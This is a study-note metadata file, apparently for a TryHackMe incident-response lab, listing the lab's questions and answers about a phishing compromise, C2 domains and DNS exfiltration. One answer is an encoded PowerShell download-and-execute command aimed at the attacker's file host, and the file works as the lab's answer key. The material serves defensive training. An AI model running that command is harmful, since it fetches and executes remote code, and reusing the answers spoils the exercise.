@@ -1,0 +1,252 @@
+{
+  "id": "network analysis labs/boogeyman 1 (thm)",
+  "title": "Boogeyman 1 (THM)",
+  "slug": "boogeyman-1-thm",
+  "relPath": "Network Analysis Labs/Boogeyman 1 (THM).md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-attack-vectors",
+  "curriculumSectionTitle": "Advanced Attack Vectors & Internals",
+  "tags": [
+    "PowerShell",
+    "Phishing",
+    "Network",
+    "C2"
+  ],
+  "mitre": [],
+  "parentId": "network analysis labs",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "network analysis labs"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "network analysis labs",
+      "title": "Network Analysis Labs",
+      "slug": "network-analysis-labs"
+    },
+    {
+      "id": "network analysis labs/boogeyman 1 (thm)",
+      "title": "Boogeyman 1 (THM)",
+      "slug": "boogeyman-1-thm"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Boogeyman 1 (THM)"
+    },
+    {
+      "level": 2,
+      "text": "The Boogeyman is here!"
+    },
+    {
+      "level": 1,
+      "text": "Email Analysis"
+    },
+    {
+      "level": 3,
+      "text": "What is the email address used to send the phishing email?"
+    },
+    {
+      "level": 3,
+      "text": "agriffin@bpakcaging.xyz"
+    },
+    {
+      "level": 3,
+      "text": "What is the email address of the victim?"
+    },
+    {
+      "level": 3,
+      "text": "julianne.westcott@hotmail.com"
+    },
+    {
+      "level": 3,
+      "text": "What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?"
+    },
+    {
+      "level": 3,
+      "text": "elasticemail"
+    },
+    {
+      "level": 3,
+      "text": "What is the name of the file inside the encrypted attachment?"
+    },
+    {
+      "level": 3,
+      "text": "Invoice20230103.lnk"
+    },
+    {
+      "level": 3,
+      "text": "What is the password of the encrypted attachment?"
+    },
+    {
+      "level": 3,
+      "text": "Invoice2023!"
+    },
+    {
+      "level": 3,
+      "text": "Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?"
+    },
+    {
+      "level": 3,
+      "text": "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA=="
+    },
+    {
+      "level": 3,
+      "text": "Investigation Guide"
+    },
+    {
+      "level": 2,
+      "text": "JQ Cheatsheet"
+    },
+    {
+      "level": 1,
+      "text": "Endpoint Security"
+    },
+    {
+      "level": 3,
+      "text": "What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)"
+    },
+    {
+      "level": 3,
+      "text": "cdn.bpakcaging.xyz,files.bpakcaging.xyz"
+    },
+    {
+      "level": 3,
+      "text": "What is the name of the enumeration tool downloaded by the attacker?"
+    },
+    {
+      "level": 3,
+      "text": "seatbelt"
+    },
+    {
+      "level": 3,
+      "text": "What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes."
+    },
+    {
+      "level": 3,
+      "text": "C:\\\\Users\\\\j.westcott\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes8wekyb3d8bbwe\\\\LocalState\\\\plum.sqlite"
+    },
+    {
+      "level": 3,
+      "text": "What is the software that uses the file in Q3?"
+    },
+    {
+      "level": 3,
+      "text": "Microsoft Sticky Notes"
+    },
+    {
+      "level": 3,
+      "text": "What is the name of the exfiltrated file?"
+    },
+    {
+      "level": 3,
+      "text": "protecteddata.kdbx"
+    },
+    {
+      "level": 3,
+      "text": "What type of file uses the .kdbx file extension?"
+    },
+    {
+      "level": 3,
+      "text": "keepass"
+    },
+    {
+      "level": 3,
+      "text": "What is the encoding used during the exfiltration attempt of the sensitive file?"
+    },
+    {
+      "level": 3,
+      "text": "hex"
+    },
+    {
+      "level": 3,
+      "text": "What is the tool used for exfiltration?"
+    },
+    {
+      "level": 3,
+      "text": "nslookup"
+    },
+    {
+      "level": 3,
+      "text": "Investigation Guide"
+    },
+    {
+      "level": 1,
+      "text": "Network Traffic Analysis"
+    },
+    {
+      "level": 3,
+      "text": "What software is used by the attacker to host its presumed file/payload server?"
+    },
+    {
+      "level": 3,
+      "text": "python"
+    },
+    {
+      "level": 3,
+      "text": "What HTTP method is used by the C2 for the output of the commands executed by the attacker?"
+    },
+    {
+      "level": 3,
+      "text": "POST"
+    },
+    {
+      "level": 3,
+      "text": "What is the protocol used during the exfiltration activity?"
+    },
+    {
+      "level": 3,
+      "text": "dns"
+    },
+    {
+      "level": 3,
+      "text": "What is the password of the exfiltrated file?"
+    },
+    {
+      "level": 3,
+      "text": "%p9^3!lL^Mz47E2GaT^y"
+    },
+    {
+      "level": 3,
+      "text": "What is the credit card number stored inside the exfiltrated file?"
+    },
+    {
+      "level": 3,
+      "text": "4024007128269551"
+    }
+  ],
+  "overview": "Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.",
+  "study": {
+    "overview": "Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Boogeyman 1 (THM)",
+      "The Boogeyman is here!",
+      "Email Analysis",
+      "What is the email address used to send the phishing email?",
+      "agriffin@bpakcaging.xyz",
+      "What is the email address of the victim?",
+      "julianne.westcott@hotmail.com",
+      "What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?",
+      "elasticemail",
+      "What is the name of the file inside the encrypted attachment?",
+      "Invoice20230103.lnk",
+      "What is the password of the encrypted attachment?"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": []
+  }
+}
